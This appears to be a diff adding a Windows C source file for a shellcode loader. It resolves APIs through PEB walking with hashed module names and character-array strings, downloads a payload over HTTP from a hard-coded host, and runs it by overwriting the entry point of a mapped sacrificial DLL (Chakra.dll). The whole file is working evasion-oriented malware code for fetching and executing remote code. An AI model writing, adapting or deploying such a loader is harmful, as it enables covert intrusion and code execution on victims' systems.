@@ -1,0 +1,323 @@
+#include <windows.h>
+#include "structs.h"
+
+#define KERNEL32_HASH	0x779b2700
+#define NTDLL_HASH		0x57552168
+#define LOADLIBRARYA_HASH 0xef6a4586
+
+UINT64 GetModule(DWORD dwHash) {
+
+	PPEB pPeb;
+	PPEB_LDR_DATA pLdr;
+	PLDR_DATA_TABLE_ENTRY pLdte, pHead;
+
+	pPeb = (PPEB)__readgsqword(0x60);
+	pLdr = pPeb->Ldr;
+	pLdte = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;
+	pHead = pLdte;
+
+	do {
+		if (HashDjb2W(pLdte->BaseDllName.Buffer) == dwHash) {
+			return (UINT64)pLdte->DllBase;
+		}
+
+		pLdte = (PLDR_DATA_TABLE_ENTRY)((PLIST_ENTRY)pLdte)->Flink;
+	}while (pLdte != pHead);
+
+	return 0;
+}
+
+UINT64 GetProcAddr(UINT64 hModule, CHAR* cFuncName) {
+
+	if (!hModule) {
+		return 0;
+	}
+	PIMAGE_EXPORT_DIRECTORY pImgExp;
+
+	pImgExp = (PIMAGE_EXPORT_DIRECTORY)(hModule + ((PIMAGE_NT_HEADERS)(hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	PDWORD  pAddressOfFunctions = (PDWORD)(hModule + pImgExp->AddressOfFunctions);
+	PDWORD  pAddressofNames = (PDWORD)(hModule + pImgExp->AddressOfNames);
+	PWORD   pAddressofOrdinals = (PWORD)(hModule + pImgExp->AddressOfNameOrdinals);
+
+	for (int i = 0; i < pImgExp->NumberOfFunctions; i++) {
+		if (my_strcmp((CHAR*)(hModule + pAddressofNames[i]), cFuncName) == 0) {
+			WORD	wOrdinal = pAddressofOrdinals[i];
+			return (UINT64)(hModule + pAddressOfFunctions[wOrdinal]);
+		}
+	}
+
+	return 0;
+}
+
+BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPoint, PNTAPIFP pNtApi) {
+
+	HANDLE				hFile = INVALID_HANDLE_VALUE,
+						hSection = NULL;
+	NTSTATUS			STATUS = STATUS_SUCCESS;
+	ULONG_PTR			uMappedModule = NULL;
+	SIZE_T				sViewSize = NULL;
+	PIMAGE_NT_HEADERS	pImageNtHeaders = NULL;
+	PIMAGE_DOS_HEADER	pImageDosHeader = NULL;
+	HANDLE				hFileMap = INVALID_HANDLE_VALUE;
+
+
+
+	if ((hFile = ((fnCreateFileW)pNtApi->pCreateFileW)(szDllFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE) {
+
+
+		if (NT_SUCCESS((STATUS = pNtApi->pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0X00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
+
+			if (NT_SUCCESS((STATUS = pNtApi->pNtMapViewOfSection(hSection, (HANDLE)-1, &uMappedModule, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
+				*phModule = uMappedModule;
+				pImageDosHeader = (PIMAGE_DOS_HEADER)uMappedModule;
+				pImageNtHeaders = (PIMAGE_NT_HEADERS)(uMappedModule + pImageDosHeader->e_lfanew);
+				*puEntryPoint = uMappedModule + pImageNtHeaders->OptionalHeader.AddressOfEntryPoint;
+
+				return TRUE;
+			}
+
+		}
+
+	}
+
+	return FALSE;
+
+}
+
+
+
+BOOL VerifyInject(IN ULONG_PTR uMappedModule, IN ULONG_PTR uEntryPoint, IN SIZE_T szPayloadSize) {
+
+	PIMAGE_NT_HEADERS		pImageNtHeaders = NULL;
+	PIMAGE_SECTION_HEADER	pImageSectionHeader = NULL;
+	ULONG_PTR				uTextAddress = NULL;
+	SIZE_T					szTextSize = NULL,
+							szTextSizeLeft = NULL;
+
+	pImageNtHeaders = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
+	pImageSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeaders);
+
+	for (int i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++) {
+
+		if ((*(ULONG*)pImageSectionHeader[i].Name | 0x20202020) == 0x7865742e) {
+			uTextAddress = uMappedModule + pImageSectionHeader[i].VirtualAddress;
+			szTextSize = pImageSectionHeader[i].Misc.VirtualSize;
+			break;
+		}
+
+	}
+
+	if (uTextAddress) {
+		szTextSizeLeft = szTextSize - (uEntryPoint - uTextAddress);
+		if (szTextSizeLeft >= szPayloadSize)
+			return TRUE;
+
+	}
+
+	return FALSE;
+}
+
+VOID ExecuteShellcode(unsigned char* shellcode, SIZE_T szSize, UINT64 kernel32dll, LPWSTR wsSacrificialDll, PNTAPIFP pNtApi) {
+
+	LPVOID		pAddress = NULL;
+	HANDLE		hThread = INVALID_HANDLE_VALUE;
+	HMODULE		hModule = NULL;
+	ULONG_PTR	uEntryPoint = NULL;
+	DWORD		dwOldProtection = 0;
+
+	UINT64 VirtualProtectFunc, CreateThreadFunc, WaitForSingleObjectFunc;
+
+	CHAR virtualprotect_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};
+	VirtualProtectFunc = (UINT64)GetProcAddr(kernel32dll, virtualprotect_c);
+	CHAR createthread_c[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
+	CreateThreadFunc = (UINT64)GetProcAddr(kernel32dll, createthread_c);
+	CHAR waitforsingleobject_c[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0};
+	WaitForSingleObjectFunc = (UINT64)GetProcAddr(kernel32dll, waitforsingleobject_c);
+
+
+	if (LoadDllFile(wsSacrificialDll, &hModule, &uEntryPoint, pNtApi)) {
+
+		if (VerifyInject((ULONG_PTR)hModule, uEntryPoint, sizeof(shellcode))) {
+
+			if (((fnVirtualProtect)VirtualProtectFunc)(uEntryPoint, szSize, PAGE_READWRITE, &dwOldProtection)) {
+
+				my_memcpy(uEntryPoint, shellcode, szSize);
+
+				if (((fnVirtualProtect)VirtualProtectFunc)(uEntryPoint, szSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
+
+					hThread = ((fnCreateThread)CreateThreadFunc)(NULL, 0X00, uEntryPoint, NULL, 0x00, NULL);
+					((fnWaitForSingleObject)WaitForSingleObjectFunc)(hThread, INFINITE);
+
+				}
+
+			}
+
+		}
+	}
+}
+
+VOID DownloadExec() {
+
+
+	HINTERNET		hInternet = NULL,
+					hConnect  = NULL,
+					hRequest  = NULL;
+
+	DWORD			dwOpenRequestFlags =	INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
+											INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
+											INTERNET_FLAG_KEEP_CONNECTION |
+											INTERNET_FLAG_NO_AUTH |
+											INTERNET_FLAG_NO_AUTO_REDIRECT |
+											INTERNET_FLAG_NO_COOKIES |
+											INTERNET_FLAG_NO_UI |
+											INTERNET_FLAG_RELOAD;
+
+	DWORD			dwStatusCode = 0;
+	DWORD			dwLength = sizeof(DWORD);
+	DWORD			dwBytesAvailable;
+	BYTE			*pMessageBody = NULL, *pShellCode = NULL;
+	DWORD			dwSizeOfPayload = 0;
+	DWORD			dwFseek = 0;
+	BOOL			bSuccess = TRUE;
+
+	CHAR			useragent[] = {'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '6', '.', '1', ';', ' ', 'W', 'O', 'W', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '9', '6', '.', '0', '.', '4', '6', '6', '4', '.', '1', '1', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', 0};
+	CHAR			domain[] = {'1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '7', 0};
+	INTERNET_PORT	nServerPort = 80;
+	CHAR			requestType[] = {'G', 'E', 'T', 0};
+	CHAR			resource[] = {'s', 'i', 'z', 'e', 'd', '.', 'b', 'i', 'n', 0};
+	
+
+	
+	WCHAR	wsSacrificialDLL[] = {L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'C', L'h', L'a', L'k', L'r', L'a', L'.', L'd', L'l', L'l', 0};
+
+	UINT64  wininetdll, msvcrtdll, ntdll, kernel32dll;
+	UINT64	InternetOpenAFunc, InternetConnectAFunc, HttpOpenRequestAFunc, HttpSendRequestAFunc, HttpQueryInfoAFunc, InternetQueryDataAvailableFunc,
+			InternetReadFileFunc, InternetCloseHandleFunc, callocFunc, freeFunc, LoadLibraryAFunc;
+
+	NTAPIFP ntApi = { 0x00 };
+
+	//Kernel32.DLL
+	kernel32dll = (UINT64)GetModule(KERNEL32_HASH);
+	CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
+	LoadLibraryAFunc = GetProcAddr(kernel32dll, loadlibrarya_c);
+
+
+	//WinInet.DLL Functions
+	CHAR wininetdll_c[] = {'w', 'i', 'n', 'i', 'n', 'e', 't', 0};
+	wininetdll = (UINT64)((fnLoadLibraryA)LoadLibraryAFunc)(wininetdll_c);
+	CHAR internetopena_c[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', 0};
+	InternetOpenAFunc = (UINT64)GetProcAddr(wininetdll, internetopena_c);
+	CHAR internetconnecta_c[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'o', 'n', 'n', 'e', 'c', 't', 'A', 0};
+	InternetConnectAFunc = (UINT64)GetProcAddr(wininetdll, internetconnecta_c);
+	CHAR httpopenrequest_c[] = {'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0};
+	HttpOpenRequestAFunc = (UINT64)GetProcAddr(wininetdll, httpopenrequest_c);
+	CHAR httpsendrequesta_c[] = {'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0};
+	HttpSendRequestAFunc = (UINT64)GetProcAddr(wininetdll, httpsendrequesta_c);
+	CHAR httpqueryinfoa_c[] = {'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'A', 0};
+	HttpQueryInfoAFunc = (UINT64)GetProcAddr(wininetdll, httpqueryinfoa_c);
+	CHAR internetquerydataavailable_c[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0};
+	InternetQueryDataAvailableFunc = (UINT64)GetProcAddr(wininetdll, internetquerydataavailable_c);
+	CHAR internetreadfile_c[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0};
+	InternetReadFileFunc = (UINT64)GetProcAddr(wininetdll, internetreadfile_c);
+	CHAR internetclosehandle_c[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
+	InternetCloseHandleFunc = (UINT64)GetProcAddr(wininetdll, internetclosehandle_c);
+
+	//MSVCRT.DLL Functions
+	CHAR msvcrtdll_c[] = {'m', 's', 'v', 'c', 'r', 't', 0};
+	msvcrtdll = (UINT64)((fnLoadLibraryA)LoadLibraryAFunc)(msvcrtdll_c);
+	CHAR calloc_c[] = {'c', 'a', 'l', 'l', 'o', 'c', 0};
+	callocFunc = (UINT64)GetProcAddr(msvcrtdll, calloc_c);
+	CHAR free_c[] = {'f', 'r', 'e', 'e', 0};
+	freeFunc = (UINT64)GetProcAddr(msvcrtdll, free_c);
+
+	//NTDLL.DLL
+	ntdll = (UINT64)GetModule(NTDLL_HASH);
+	CHAR ntcreatesection_c[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0};
+	ntApi.pNtCreateSection = (fnNtCreateSection)GetProcAddr(ntdll, ntcreatesection_c);
+	CHAR ntmapviewofsection_c[] = {'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0};
+	ntApi.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddr(ntdll, ntmapviewofsection_c);
+	CHAR createfilew_c[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0};
+	ntApi.pCreateFileW = (fnCreateFileW)GetProcAddr(kernel32dll, createfilew_c);
+
+	if ((hInternet = ((fnInternetOpenA)InternetOpenAFunc)(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0))) {
+
+
+		if ((hConnect = ((fnInternetConnectA)InternetConnectAFunc)(hInternet, domain, nServerPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))) {
+
+			if ((hRequest = ((fnHttpOpenRequestA)HttpOpenRequestAFunc)(hConnect, requestType, resource, NULL, NULL, NULL, dwOpenRequestFlags, 0))) {
+
+
+				if ((((fnHttpSendRequestA)HttpSendRequestAFunc)(hRequest, NULL, 0, NULL, 0))) {
+
+
+					if (((fnHttpQueryInfoA)HttpQueryInfoAFunc)(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwLength, NULL)) {
+
+						if (dwStatusCode == HTTP_STATUS_OK) {
+
+							while (((fnInternetQueryDataAvailable)InternetQueryDataAvailableFunc)(hRequest, &dwBytesAvailable, 0, 0)) {
+
+
+								DWORD dwBytesRead;
+
+
+								if (!dwSizeOfPayload) {
+
+
+									if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, &dwSizeOfPayload, sizeof(DWORD), &dwBytesRead)) {
+
+										pMessageBody = (BYTE*)((fncalloc)callocFunc)(1, dwSizeOfPayload);
+										if (pMessageBody == NULL)
+											return;
+										pShellCode = pMessageBody;
+
+									}
+
+									if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, pMessageBody, dwBytesAvailable - 4, &dwBytesRead)) {
+
+										if (dwBytesRead == 0) {
+											bSuccess = FALSE;
+											break;
+										}
+
+
+										dwFseek += dwBytesRead;
+										pMessageBody = (BYTE*)((ULONG_PTR)pMessageBody + dwFseek);
+
+									}
+
+								}
+								else {
+
+									if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, pMessageBody, dwBytesAvailable, &dwBytesRead)) {
+
+										if (dwBytesRead == 0)
+											break;
+
+										dwFseek += dwBytesRead;
+										pMessageBody = (BYTE*)((ULONG_PTR)pMessageBody + dwBytesRead);
+
+									}
+
+								}
+
+							}
+
+						}
+					}
+				}
+			}
+
+
+		}
+
+		if (bSuccess)
+			ExecuteShellcode(pShellCode, dwSizeOfPayload, kernel32dll, wsSacrificialDLL, &ntApi);
+
+		((fnfree)freeFunc)(pShellCode);
+		((fnInternetCloseHandle)InternetCloseHandleFunc)(hRequest);
+		((fnInternetCloseHandle)InternetCloseHandleFunc)(hConnect);
+		((fnInternetCloseHandle)InternetCloseHandleFunc)(hInternet);
+	}
+
+}
